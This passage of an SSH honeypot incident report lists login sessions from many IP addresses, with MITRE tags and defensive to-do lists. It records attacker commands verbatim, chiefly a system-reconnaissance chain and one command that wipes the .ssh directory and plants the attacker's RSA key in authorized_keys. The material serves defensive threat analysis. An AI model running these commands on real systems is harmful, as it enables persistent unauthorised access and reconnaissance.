- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4af47d4ab2b3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:14 |
| **Last Seen** | 2026-07-27 08:15 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:14:52` | `cowrie.session.connect` |
| `2026-07-27 08:14:57` | `cowrie.client.version` |
| `2026-07-27 08:14:57` | `cowrie.client.kex` |
| `2026-07-27 08:15:01` | `cowrie.login.success` |
| `2026-07-27 08:15:04` | `cowrie.session.params` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.success` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:04` | `cowrie.command.input` |
| `2026-07-27 08:15:05` | `cowrie.log.closed` |
| `2026-07-27 08:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e48968399e0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:17 |
| **Last Seen** | 2026-07-27 08:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:17:22` | `cowrie.session.connect` |
| `2026-07-27 08:17:24` | `cowrie.client.version` |
| `2026-07-27 08:17:24` | `cowrie.client.kex` |
| `2026-07-27 08:17:27` | `cowrie.login.success` |
| `2026-07-27 08:17:29` | `cowrie.session.params` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.success` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:29` | `cowrie.command.input` |
| `2026-07-27 08:17:30` | `cowrie.log.closed` |
| `2026-07-27 08:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c228ecc8c59b

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-07-27 08:18 |
| **Last Seen** | 2026-07-27 08:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:18:13` | `cowrie.session.connect` |
| `2026-07-27 08:18:13` | `cowrie.client.version` |
| `2026-07-27 08:18:13` | `cowrie.client.kex` |
| `2026-07-27 08:18:15` | `cowrie.login.success` |
| `2026-07-27 08:18:16` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b87096fe40d3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 08:19 |
| **Last Seen** | 2026-07-27 08:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:19:43` | `cowrie.session.connect` |
| `2026-07-27 08:19:44` | `cowrie.client.version` |
| `2026-07-27 08:19:44` | `cowrie.client.kex` |
| `2026-07-27 08:19:48` | `cowrie.login.success` |
| `2026-07-27 08:19:50` | `cowrie.session.params` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.success` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:50` | `cowrie.command.input` |
| `2026-07-27 08:19:51` | `cowrie.log.closed` |
| `2026-07-27 08:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c415614cde8

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-27 08:24 |
| **Last Seen** | 2026-07-27 08:25 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:24:50` | `cowrie.session.connect` |
| `2026-07-27 08:24:52` | `cowrie.client.version` |
| `2026-07-27 08:24:52` | `cowrie.client.kex` |
| `2026-07-27 08:24:56` | `cowrie.login.success` |
| `2026-07-27 08:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906354e50d4b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 08:37 |
| **Last Seen** | 2026-07-27 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:37:17` | `cowrie.session.connect` |
| `2026-07-27 08:37:17` | `cowrie.client.version` |
| `2026-07-27 08:37:17` | `cowrie.client.kex` |
| `2026-07-27 08:37:17` | `cowrie.login.success` |
| `2026-07-27 08:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6dde6b0b85

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 08:37 |
| **Last Seen** | 2026-07-27 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:37:17` | `cowrie.session.connect` |
| `2026-07-27 08:37:17` | `cowrie.client.version` |
| `2026-07-27 08:37:17` | `cowrie.client.kex` |
| `2026-07-27 08:37:17` | `cowrie.login.success` |
| `2026-07-27 08:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36deb683167b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 08:37 |
| **Last Seen** | 2026-07-27 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:37:26` | `cowrie.session.connect` |
| `2026-07-27 08:37:26` | `cowrie.client.version` |
| `2026-07-27 08:37:26` | `cowrie.client.kex` |
| `2026-07-27 08:37:26` | `cowrie.login.success` |
| `2026-07-27 08:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff9bdaeeb89

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 08:37 |
| **Last Seen** | 2026-07-27 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:37:26` | `cowrie.session.connect` |
| `2026-07-27 08:37:26` | `cowrie.client.version` |
| `2026-07-27 08:37:26` | `cowrie.client.kex` |
| `2026-07-27 08:37:26` | `cowrie.login.success` |
| `2026-07-27 08:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16668dd5100a

| Field | Detail |
|---|---|
| **Source IP** | `58.56.128[.]190` |
| **First Seen** | 2026-07-27 08:38 |
| **Last Seen** | 2026-07-27 08:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:38:36` | `cowrie.session.connect` |
| `2026-07-27 08:38:37` | `cowrie.client.version` |
| `2026-07-27 08:38:37` | `cowrie.client.kex` |
| `2026-07-27 08:38:40` | `cowrie.login.success` |
| `2026-07-27 08:38:41` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.128[.]190` to AbuseIPDB if not already reported
- [ ] Block `58.56.128[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb074b8e27e

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-07-27 08:38 |
| **Last Seen** | 2026-07-27 08:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:38:46` | `cowrie.session.connect` |
| `2026-07-27 08:38:47` | `cowrie.client.version` |
| `2026-07-27 08:38:47` | `cowrie.client.kex` |
| `2026-07-27 08:38:49` | `cowrie.login.success` |
| `2026-07-27 08:38:50` | `cowrie.direct-tcpip.request` |
| `2026-07-27 08:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd4e81c03535

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-27 08:42 |
| **Last Seen** | 2026-07-27 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:42:15` | `cowrie.session.connect` |
| `2026-07-27 08:42:15` | `cowrie.client.version` |
| `2026-07-27 08:42:15` | `cowrie.client.kex` |
| `2026-07-27 08:42:16` | `cowrie.login.success` |
| `2026-07-27 08:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48200837b0b5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-27 08:42 |
| **Last Seen** | 2026-07-27 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:42:15` | `cowrie.session.connect` |
| `2026-07-27 08:42:15` | `cowrie.client.version` |
| `2026-07-27 08:42:15` | `cowrie.client.kex` |
| `2026-07-27 08:42:16` | `cowrie.login.success` |
| `2026-07-27 08:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d9b1212997

| Field | Detail |
|---|---|
| **Source IP** | `5.253.38[.]188` |
| **First Seen** | 2026-07-27 08:44 |
| **Last Seen** | 2026-07-27 08:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:44:11` | `cowrie.session.connect` |
| `2026-07-27 08:44:11` | `cowrie.client.version` |
| `2026-07-27 08:44:11` | `cowrie.client.kex` |
| `2026-07-27 08:44:11` | `cowrie.login.success` |
| `2026-07-27 08:44:12` | `cowrie.session.params` |
| `2026-07-27 08:44:12` | `cowrie.command.input` |
| `2026-07-27 08:44:12` | `cowrie.command.failed` |
| `2026-07-27 08:44:12` | `cowrie.log.closed` |
| `2026-07-27 08:44:13` | `cowrie.session.params` |
| `2026-07-27 08:44:13` | `cowrie.command.input` |
| `2026-07-27 08:44:13` | `cowrie.session.file_download` |
| `2026-07-27 08:44:13` | `cowrie.log.closed` |
| `2026-07-27 08:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.38[.]188` to AbuseIPDB if not already reported
- [ ] Block `5.253.38[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57b35b19d0f5

| Field | Detail |
|---|---|
| **Source IP** | `5.253.38[.]188` |
| **First Seen** | 2026-07-27 08:44 |
| **Last Seen** | 2026-07-27 08:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:44:13` | `cowrie.session.connect` |
| `2026-07-27 08:44:13` | `cowrie.client.version` |
| `2026-07-27 08:44:13` | `cowrie.client.kex` |
| `2026-07-27 08:44:13` | `cowrie.login.success` |
| `2026-07-27 08:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.38[.]188` to AbuseIPDB if not already reported
- [ ] Block `5.253.38[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eef7f2d621b3

| Field | Detail |
|---|---|
| **Source IP** | `5.253.38[.]188` |
| **First Seen** | 2026-07-27 08:44 |
| **Last Seen** | 2026-07-27 08:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 08:44:13` | `cowrie.session.connect` |
| `2026-07-27 08:44:13` | `cowrie.client.version` |
| `2026-07-27 08:44:13` | `cowrie.client.kex` |
| `2026-07-27 08:44:14` | `cowrie.login.success` |
| `2026-07-27 08:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.38[.]188` to AbuseIPDB if not already reported
- [ ] Block `5.253.38[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4217f73f0db0

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-07-27 09:03 |
| **Last Seen** | 2026-07-27 09:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:03:16` | `cowrie.session.connect` |
| `2026-07-27 09:03:17` | `cowrie.client.version` |
| `2026-07-27 09:03:17` | `cowrie.client.kex` |
| `2026-07-27 09:03:19` | `cowrie.login.success` |
| `2026-07-27 09:03:20` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26de72302253

| Field | Detail |
|---|---|
| **Source IP** | `27.223.98[.]117` |
| **First Seen** | 2026-07-27 09:04 |
| **Last Seen** | 2026-07-27 09:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:04:03` | `cowrie.session.connect` |
| `2026-07-27 09:04:04` | `cowrie.client.version` |
| `2026-07-27 09:04:04` | `cowrie.client.kex` |
| `2026-07-27 09:04:07` | `cowrie.login.success` |
| `2026-07-27 09:04:08` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8dd671df49

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-07-27 09:04 |
| **Last Seen** | 2026-07-27 09:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:04:13` | `cowrie.session.connect` |
| `2026-07-27 09:04:13` | `cowrie.client.version` |
| `2026-07-27 09:04:13` | `cowrie.client.kex` |
| `2026-07-27 09:04:15` | `cowrie.login.success` |
| `2026-07-27 09:04:16` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b42833d7c5

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-27 09:06 |
| **Last Seen** | 2026-07-27 09:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:06:28` | `cowrie.session.connect` |
| `2026-07-27 09:06:29` | `cowrie.client.version` |
| `2026-07-27 09:06:29` | `cowrie.client.kex` |
| `2026-07-27 09:06:30` | `cowrie.login.success` |
| `2026-07-27 09:06:31` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e35300b0c19

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-27 09:06 |
| **Last Seen** | 2026-07-27 09:07 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:06:41` | `cowrie.session.connect` |
| `2026-07-27 09:06:41` | `cowrie.client.version` |
| `2026-07-27 09:06:41` | `cowrie.client.kex` |
| `2026-07-27 09:06:44` | `cowrie.login.success` |
| `2026-07-27 09:06:45` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7a3d098eb6

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-27 09:13 |
| **Last Seen** | 2026-07-27 09:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:13:51` | `cowrie.session.connect` |
| `2026-07-27 09:13:51` | `cowrie.client.version` |
| `2026-07-27 09:13:51` | `cowrie.client.kex` |
| `2026-07-27 09:13:53` | `cowrie.login.success` |
| `2026-07-27 09:13:53` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e886ce6de149

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-27 09:15 |
| **Last Seen** | 2026-07-27 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 09:15:08` | `cowrie.session.connect` |
| `2026-07-27 09:15:08` | `cowrie.client.version` |
| `2026-07-27 09:15:08` | `cowrie.client.kex` |
| `2026-07-27 09:15:08` | `cowrie.login.success` |
| `2026-07-27 09:15:09` | `cowrie.direct-tcpip.request` |
| `2026-07-27 09:15:09` | `cowrie.direct-tcpip.ja4` |
